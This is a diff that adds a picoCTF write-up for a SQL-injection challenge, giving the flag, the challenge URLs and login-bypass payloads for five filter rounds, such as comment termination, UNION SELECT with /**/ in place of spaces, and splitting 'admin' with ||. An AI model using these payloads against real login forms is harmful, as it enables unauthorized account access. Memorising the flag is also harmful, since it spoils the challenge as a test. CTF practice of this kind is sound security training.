@@ -1,0 +1,49 @@
+picoCTF{y0u_m4d3_1t_96486d415c04a1abbbcf3a2ebe1f4d02}
+
+
+Here are websites
+-->http://jupiter.challenges.picoctf.org:40791/filter.php
+-->http://jupiter.challenges.picoctf.org:40791/
+
+
+-->In round one filter is or
+
+SELECT * FROM users WHERE username='admin' AND password='admin';
+
+as we need to bypass password because we don't know what the password actually is
+
+SELECT * FROM users WHERE username='admin';--' AND password='admin';
+
+admin';-- this will comment all other things and we pass round 1
+
+--> In Round2: or and like = --
+
+SELECT * FROM users WHERE username='admin'; AND password='admin';
+
+admin'; --> this end the statement and we pass the filter
+
+--> IN Round3: or and = like > < --
+
+We can use same tricks to bypass filters
+
+
+-->In Round4: or and = like > < -- admin
+
+Now it is restriction that we are not going to use word admin
+so we can use a trick that we use union
+
+SELECT * FROM users WHERE username='asna'/**/UNION/**/SELECT/**/*/**/FROM/**/users/**/LIMIT/**/1;
+
+we concatenate 2 with UNION and limit 1 because in most cases admin is at first
+
+--> In Round5: or and = like > < -- union admin
+
+This time we even don't use union
+
+in SQL  we concatenate strings through || that's how we can pass string like
+
+SELECT * FROM users WHERE username='ad'||'min'; AND password='admin';
+
+ad'||'min'; this concatenate strings and ; end the statement
+
+
